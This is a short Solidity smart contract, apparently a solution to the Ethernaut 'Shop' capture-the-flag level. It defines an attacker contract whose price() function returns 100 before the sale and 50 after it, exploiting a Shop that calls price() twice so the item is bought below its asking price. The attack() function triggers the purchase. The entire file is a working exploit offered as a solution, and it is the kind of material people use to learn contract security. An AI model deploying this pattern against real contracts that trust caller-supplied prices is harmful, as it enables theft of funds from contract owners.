pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract PriceManipulator {
    Shop immutable public shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view returns (uint) {
        return !shop.isSold() ? 100 : 50; // Sufficient to flip isSold but stop price updates
    }

    function attack() public {
        shop.buy();
    }
}
